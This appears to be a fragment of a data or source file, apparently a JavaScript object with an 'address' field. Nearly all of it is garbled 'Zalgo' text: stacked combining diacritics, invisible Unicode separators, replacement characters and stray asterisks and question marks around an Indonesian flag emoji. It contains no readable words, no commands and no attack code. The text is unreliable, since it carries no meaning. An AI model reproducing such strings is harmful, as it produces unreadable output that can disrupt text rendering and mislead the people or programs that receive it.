͍̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊ ',
						address: '🇮🇩̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̴̡̧̛̛̛̯̠͔̟͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭̿̿̀̊̒́̀̌̂̔̍̓͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚͡⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̵̢̧̧̘͇͙̟̫͎͎̹̹̼͓̞͈͖̲͎̙̞͎͖̙̩̘̍̐̿̈́̈́͊͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̵̧̧̛̯̠͔̟̼͓̞͈͖̲͎̙̞͎͖̙̩̘̿̿̀̊̒́̀̌̂̔̍̓͂́̔̉̉̍̕͡͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͝͝